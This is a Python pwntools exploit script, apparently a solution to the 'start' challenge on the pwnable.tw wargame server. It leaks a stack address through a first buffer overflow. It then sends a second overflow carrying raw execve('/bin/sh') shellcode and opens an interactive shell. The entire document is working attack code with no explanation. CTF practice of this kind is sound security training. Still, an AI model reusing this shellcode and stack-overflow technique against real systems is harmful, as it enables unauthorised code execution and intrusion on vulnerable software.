from pwn import *
from LibcSearcher import *
context(arch = "i386", os = "Linux", log_level = "Debug")
io = process("./start")
io = remote("chall.pwnable.tw", 10000)
# gdb.attach(io)

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims             :io.recvuntil(delims)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

restart = 0x8048087
payload = p32(0x41414141) * 5 + p32(restart)
ru("CTF:")
s(payload)
shellcode_addr = u32(r()[0:4].ljust(4, '\0')) + 0x14
log.info("shellcode address : " + hex(shellcode_addr))

payload  = p32(0x42424242) * 5 + p32(shellcode_addr)
payload += shellcode
sl(payload)
itr()